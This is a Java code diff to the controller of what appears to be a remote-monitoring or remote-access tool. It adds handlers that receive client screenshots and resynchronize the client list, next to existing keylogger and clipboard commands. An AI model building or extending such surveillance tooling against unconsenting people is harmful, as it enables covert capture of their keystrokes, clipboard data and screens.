@@ -6,12 +6,21 @@ import models.SystemInfoModel;
 import org.json.JSONArray;
 import org.json.JSONObject;
 import utils.JSON;
+import utils.console;
 
+import javax.imageio.ImageIO;
+import javax.swing.*;
+import java.awt.image.BufferedImage;
+import java.io.ByteArrayInputStream;
+import java.io.File;
+import java.io.IOException;
+import java.nio.ByteBuffer;
 import java.util.HashMap;
 import java.util.Map;
 import java.util.Vector;
 
 import static utils.Command.*;
+import static utils.Command.COMMAND_CLIENT_SCREEN;
 
 public class ConsumeController {
 
@@ -22,6 +31,34 @@ public class ConsumeController {
         put(COMMAND_MONITORING, ConsumeController::getMonitoring);
         put(COMMAND_CLIPBOARD, ConsumeController::getClipboard);
         put(COMMAND_KEYLOGGER, ConsumeController::getKeylogger);
+        put(COMMAND_SYNC, ConsumeController::synchronize);
+        put(COMMAND_CLIENT_SCREEN, ConsumeController::getScreen);
+    }
+
+    private static void getScreen(JSON input, Admin admin) {
+        try {
+            JSONArray imageBuffer = new JSONArray(input.get("image"));
+            int length = input.getInt("length");
+            byte[] arr = new byte[length];
+
+            for (int i = 0; i < length; i++) {
+                arr[i] = Byte.parseByte(imageBuffer.get(i).toString());
+            }
+
+            ByteArrayInputStream temp = new ByteArrayInputStream(ByteBuffer.wrap(arr).array());
+            BufferedImage image2 = ImageIO.read(ImageIO.createImageInputStream(temp));
+            ImageIcon temp1 = new ImageIcon(image2);
+            Admin.getGui().updateClientScreen(temp1);
+            console.log("alo");
+        } catch (Exception e) {
+            throw new RuntimeException(e);
+        }
+    }
+
+    private static void synchronize(JSON input, Admin admin) {
+        Admin.getGui().sync();
+        admin.setClients(new HashMap());
+        ConsumeController.getAllClients(input, admin);
     }
 
     private static void getKeylogger(JSON input, Admin admin) {
